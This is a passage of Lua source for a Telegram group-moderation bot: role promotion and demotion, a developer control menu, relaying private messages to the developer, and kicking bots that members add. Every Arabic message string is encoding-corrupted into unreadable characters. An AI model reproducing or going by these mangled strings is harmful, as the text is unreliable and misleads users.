Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.sender_user_id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrmfm == "ูุฏูุฑ" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.sender_user_id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrmfm == "ุนุถู" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..DEV_SOOFY..' โฉ ุจูุฌุงุญ', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^ุฑูุน (.*) @(.*)") then 
local text1 = {string.match(text, "^(ุฑูุน) (.*) @(.*)$")}
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..text1[2]..msg.chat_id_)
if mrmfm == "ูููุฒ" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrmfm == "ุงุฏูู" and Admin(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrmfm == "ูุฏูุฑ" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:set(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrmfm == "ุนุถู" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุฑูุนู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^ุชูุฒูู (.*) @(.*)") then 
local text1 = {string.match(text, "^(ุชูุฒูู) (.*) @(.*)$")}
if Devmfm:sismember(mustafa.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrmfm = Devmfm:get(mustafa.."Comd:New:rt:mfm:"..text1[2]..msg.chat_id_)
if mrmfm == "ูููุฒ" and VipMem(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_, result.id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrmfm == "ุงุฏูู" and Admin(msg) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, result.id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrmfm == "ูุฏูุฑ" and Manager(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_, result.id_)
Devmfm:del(mustafa.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrmfm == "ุนุถู" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู โซ โจ ['..result.title_..'](t.me/'..(text1[3] or 'KKDKKB7')..')'..' โฉ\nโ๏ธุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุจูุฌุงุญ', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
Devmfm:incr(mustafa..'mfm:UsersMsgs'..mustafa..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:incr(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:incr(mustafa..'mfm:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not Devmfm:sismember(mustafa.."mfm:Users",msg.chat_id_) then
Devmfm:sadd(mustafa.."mfm:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
if ChatType == 'pv' then 
if text == '/start' or text == 'ุฑุฌูุน ุ๐โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธูุฑุญุจุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธุงูุช ุงููุทูุฑ ุงูุงุณุงุณู ููุง \nโ๏ธุงููู ุงุฒุฑุงุฑ ุณูุฑุณ ุงูุดูุทุงู \nโ๏ธุชุณุชุทูุน ุงูุชุญูู ุจูู ุงูุงูุงูุฑ ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {
{'ูุถุน ุงุณู ุงูุจูุช','โซ ุชุญุฏูุซ โ','ูุถุน ูููุดู ุงููุทูุฑ'},
{'โซ ุงููุทูุฑูู โ','โซ ุงูุงุญุตุงุฆูุงุช โ'},
{'โซ ุงููุฌููุนุงุช โ','ุฑูุงุจุท ุงููุฑูุจุงุช','โซ ุงููุดุชุฑููู โ'},
{'โซ ุชุนุทูู ุงูุชูุงุตู โ','โซ ุชูุนูู ุงูุชูุงุตู โ'},
{'ุชูุธูู ุงููุฑูุจุงุช','โซ ูุงุฆูู ุงูุนุงู โ','ุชูุธูู ุงููุดุชุฑููู'},
{'โซ ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู โ'},
{'ุชุนุทูู ุชุฑุญูุจ ุงูุจูุช','ุชูุนูู ุชุฑุญูุจ ุงูุจูุช'},
{'โซ ุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ โ'},
{'โซ ุชุนุทูู ุงููุบุงุฏุฑู โ','โซ ุชูุนูู ุงููุบุงุฏุฑู โ'},
{'โซ ุชุนุทูู ุงูุงุฐุงุนู โ','โซ ุชูุนูู ุงูุงุฐุงุนู โ'},
{'โซ ุงุฐุงุนู ุจุงูุชุซุจูุช โ'},
{'โซ ุงุฐุงุนู ุนุงู โ','โซ ุงุฐุงุนู ุฎุงุต โ'},
{'โซ ุงุฐุงุนู ุนุงู ุจุงูุชูุฌูู โ','โซ ุงุฐุงุนู ุฎุงุต ุจุงูุชูุฌูู โ'},
{'~ ุชุนููู ููุงูุด ุงูุงูุงูุฑ ~'},
{'ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู','ุชูุนูู ุงูุจูุช ุงูุฎุฏูู'},
{'ุชุญุฏูุซ ุงูุณูุฑุณ','ุฌูุจ ูุณุฎู ุงููุฑูุจุงุช'},
{'โซ ุญุฐู ุฑุฏ ุนุงู โ','โซ ุงูุฑุฏูุฏ ุงูุนุงู โ','โซ ุงุถู ุฑุฏ ุนุงู โ'},
{'โซ ุญุฐู ุฑุฏ ุงูุฎุงุต โ','โซ ุชุนููู ุฑุฏ ุงูุฎุงุต โ'},
{'ุญุฐู ููุงุฉ ุงูุงุดุชุฑุงู','ููุงุฉ ุงูุงุดุชุฑุงู','ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู'},
{'ุญุฐู ูููุดู ุงูุงุดุชุฑุงู','ูููุดู ุงูุงุดุชุฑุงู','ุชุบูุฑ ูููุดู ุงูุงุดุชุฑุงู'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ ุชุนููู ููุงูุด ุงูุงูุงูุฑ ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุชุนุฏูู ูุชุบููุฑ ููุงูุด ุณูุฑุณ ุงูุดูุทุงู ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {
{'ุญุฐู ูููุดุฉ ุงูุงูุฏู','ุชุนููู ูููุดุฉ ุงูุงูุฏู'},
{'ุชุนููู ุงูุฑ ุงูุงูุงูุฑ'},
{'ุชุนููู ุงูุฑ ู3','ุชุนููู ุงูุฑ ู2','ุชุนููู ุงูุฑ ู1'},
{'ุชุนููู ุงูุฑ ู6','ุชุนููู ุงูุฑ ู5','ุชุนููู ุงูุฑ ู4'},
{'ุงุณุชุนุงุฏุฉ ููุงูุด ุงูุงูุงูุฑ'},
{'ุฑุฌูุน ุ๐โ'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' and ChCheck(msg) then  
if not Devmfm:get(mustafa..'mfm:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {{{text="โ ุงููุทูุฑ .",url="t.me/"..(dp.username_ or "KKDKKB7")}}}
local start = Devmfm:get(mustafa.."mfm:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "โ๏ธูุฑุญุจุง ุงูุง ุจูุช ุงุณูู "..NameBot.."\nโ๏ธุงุฎุชุตุงุตู ุญูุงูุฉ ุงููุฌููุนุงุช\nโ๏ธูู ุงูุชูููุด ูุงูุณุจุงู ูุงูุฎุฎ .. . ุ\nโ๏ธุชูุนููู ุณูู ููุฌุงูุง ููุท ูู ุจุฑูุนู ุงุฏูู ูู ูุฌููุนุชู ูุงุฑุณู ุงูุฑ โซ ุชูุนูู\nโ๏ธุณูุชู ุฑูุน ุงูุงุฏูููู ูุงูููุดุฆ ุชููุงุฆูุง"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
Devmfm:setex(mustafa..'mfm:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
if not SecondSudo(msg) and not Devmfm:sismember(mustafa..'mfm:Ban:Pv',msg.sender_user_id_) and not Devmfm:get(mustafa..'mfm:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_mfm(msg.sender_user_id_, msg.id_, 1, 'โ๏ธุชู ุงุฑุณุงู ุฑุณุงูุชู ุงูู [ุงููุทูุฑ](t.me/'..(chat.username_ or "KKDKKB7")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'โ๏ธุชู ุงุฑุณุงู ุงูููุตู ูู โซ โค\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'ุญุธุฑ' or text == 'ุญุถุฑ' then
local Text = 'โ๏ธุงูุนุถู โซ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nโ๏ธุชู ุญุธุฑู ูู ุงูุชูุงุตู'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
Devmfm:sadd(mustafa..'mfm:Ban:Pv',data.id_)  
return false  
end 
if text == 'ุงูุบุงุก ุงูุญุธุฑ' or text == 'ุงูุบุงุก ุญุธุฑ' then
local Text = 'โ๏ธุงูุนุถู โซ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nโ๏ธุชู ุงูุบุงุก ุญุธุฑู ูู ุงูุชูุงุตู'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
Devmfm:srem(mustafa..'mfm:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุถู ูุงู ุจุญุธุฑ ุงูุจูุช ูุง ุชุณุชุทูุน ุงุฑุณุงู ุงูุฑุณุงุฆู ูู', 1, 'md')
return false  
end 
if text then
Dev_mfm(id_user, 0, 1, text, 1, "md")  
Text = 'โ๏ธุชู ุงุฑุณุงู ุงูุฑุณุงูู ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝูู โซ โค'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = 'โ๏ธุชู ุงุฑุณุงู ุงูููุตู ุงูู โซ โค'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = 'โ๏ธุชู ุงุฑุณุงู ุงูุตูุฑู ุงูู โซ โค'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = 'โ๏ธุชู ุงุฑุณุงู ุงููุชุญุฑูู ุงูู โซ โค'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = 'โ๏ธุชู ุงุฑุณุงู ุงูุจุตูู ุงูู โซ โค'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
if text and Devmfm:get(mustafa..'mfm:Start:Bots'..msg.sender_user_id_) then
if text == 'ุงูุบุงุก' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุณุชุงุฑุช', 1, 'md')
Devmfm:del(mustafa..'mfm:Start:Bots'..msg.sender_user_id_) 
return false
end
Devmfm:set(mustafa.."mfm:Start:Bot",text)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ูููุดุฉ ุงูุณุชุงุฑุช', 1, 'md')
Devmfm:del(mustafa..'mfm:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'ุชุนููู ุฑุฏ ุงูุฎุงุต' or text == 'ุถุน ูููุดู ุณุชุงุฑุช' or text == 'โซ ุชุนููู ุฑุฏ ุงูุฎุงุต โ' then 
Devmfm:set(mustafa..'mfm:Start:Bots'..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ูู ูููุดุฉ ุงูุณุชุงุฑุช ุงูุงู', 1, 'md')
return false
end
if text == 'ุญุฐู ุฑุฏ ุงูุฎุงุต' or text == 'ุญุฐู ูููุดู ุณุชุงุฑุช' or text == 'โซ ุญุฐู ุฑุฏ ุงูุฎุงุต โ' then 
Devmfm:del(mustafa..'Start:Bot') 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญุฐู ูููุดุฉ ุงูุณุชุงุฑุช ุจูุฌุงุญ', 1, 'md')
end
if text == 'ุฌูุจ ุฑุฏ ุงูุฎุงุต' then  
local start = Devmfm:get(mustafa.."mfm:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "โ๏ธูุฑุญุจุง ุงูุง ุจูุช ุงุณูู "..NameBot.."\nโ๏ธุงุฎุชุตุงุตู ุญูุงูุฉ ุงููุฌููุนุงุช\nโ๏ธูู ุงูุชูููุด ูุงูุณุจุงู ูุงูุฎุฎ .. . ุ\nโ๏ธุชูุนููู ุณูู ููุฌุงูุง ููุท ูู ุจุฑูุนู ุงุฏูู ูู ูุฌููุนุชู ูุงุฑุณู ุงูุฑ โซ ุชูุนูู\nโ๏ธุณูุชู ุฑูุน ุงูุงุฏูููู ูุงูููุดุฆ ุชููุงุฆูุง"
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'ุชูุนูู ุงูุชูุงุตู' or text == 'โซ ุชูุนูู ุงูุชูุงุตู โ' then   
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุชูุงุตู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Texting:Pv') 
end
if text == 'ุชุนุทูู ุงูุชูุงุตู' or text == 'โซ ุชุนุทูู ุงูุชูุงุตู โ' then  
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุชูุงุตู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Texting:Pv',true) 
end
end
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
Devmfm:incr(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:set(mustafa.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(mustafa) then 
Devmfm:srem(mustafa.."mfm:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) then
SendText(DevId,"โ๏ธุชู ุทุฑุฏ ุงูุจูุช ูู ุงููุฌููุนู โซ โค \nโ โ โ โ โ โ โ โ โ\nโ๏ธุจูุงุณุทุฉ โซ "..Name.."\nโ๏ธุงุณู ุงููุฌููุนู โซ ["..NameChat.."]\nโ๏ธุงูุฏู ุงููุฌููุนู โซ โค \nโจ `"..msg.chat_id_.."` โฉ\nโ โ โ โ โ โ โ โ โ\nโ๏ธุงูููุช โซ "..os.date("%I:%M%p").."\nโ๏ธุงูุชุงุฑูุฎ โซ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
Devmfm:incr(mustafa..'mfm:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
Devmfm:incr(mustafa..'mfm:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
if text ==('ุชูุนูู') and not SudoBot(msg) and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:FreeBot'..mustafa) then
if ChatType == 'pv' then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุงุชุณุชุทูุน ุชูุนููู ููุง ูุฑุฌู ุงุถุงูุชู ูู ูุฌููุนู ุงููุง', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุฌููุนู ุนุงุฏูู ูููุณุช ุฎุงุฑูู ูุง ุชุณุชุทูุน ุชูุนููู ูุฑุฌู ุงู ุชุถุน ุณุฌู ุฑุณุงุฆู ุงููุฌููุนู ุถุงูุฑ ูููุณ ูุฎูู ููู ุจุนุฏูุง ููููู ุฑูุนู ุงุฏูู ุซู ุชูุนููู', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
